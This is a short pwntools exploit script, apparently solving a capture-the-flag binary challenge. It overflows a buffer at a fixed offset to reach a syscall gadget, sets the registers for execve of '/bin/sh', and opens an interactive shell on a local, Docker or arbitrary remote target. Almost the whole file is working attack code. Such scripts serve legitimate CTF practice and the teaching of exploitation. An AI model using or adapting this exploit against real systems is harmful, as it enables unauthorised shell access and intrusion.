#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *main+0x115
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def launch(rax, rdi, rsi, rdx, chain):
    io.sendlineafter(b">", chain)
    io.sendlineafter(b">", rax)
    io.sendline(rdi)
    io.sendline(rsi)
    io.sendline(rdx)


def solve():
    
    offset = 16+4+4+4+8+4
    syscall = 0x4012ca
    chain = flat({
        offset: [
            syscall
        ]
    })
    launch(str(0x3b).encode(), b"/bin/sh\x00", b"0", b"0", chain)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

